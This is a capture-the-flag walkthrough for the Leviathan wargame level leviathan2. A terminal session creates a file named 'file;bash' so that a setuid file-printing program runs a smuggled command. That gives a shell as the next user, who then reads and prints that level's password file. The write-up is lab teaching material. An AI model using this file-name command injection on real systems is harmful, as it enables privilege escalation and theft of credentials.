## leviathan2

```bash
leviathan2@gibson:~$ ls
printfile
leviathan2@gibson:~$ ./printfile 
*** File Printer ***
Usage: ./printfile filename
leviathan2@gibson:~$ mktemp -d
/tmp/tmp.I0DqyO6nxz
leviathan2@gibson:~$ cd /tmp/tmp.I0DqyO6nxz
leviathan2@gibson:/tmp/tmp.I0DqyO6nxz$ touch 'file;bash'
leviathan2@gibson:/tmp/tmp.I0DqyO6nxz$ ls
file;bash
leviathan2@gibson:/tmp/tmp.I0DqyO6nxz$ cd ~
leviathan2@gibson:~$ ./printfile /tmp/tmp.I0DqyO6nxz/file\;bash 
/bin/cat: /tmp/tmp.I0DqyO6nxz/file: Permission denied
leviathan3@gibson:~$ ls
printfile
leviathan3@gibson:~$ cat /etc/leviathan_pass/leviathan3
Q0G8j4sakn
```
- ` touch 'file;bash' `- By using a semicolon, you are attempting to execute the command "bash" after running "printfile" to gain an interactive shell.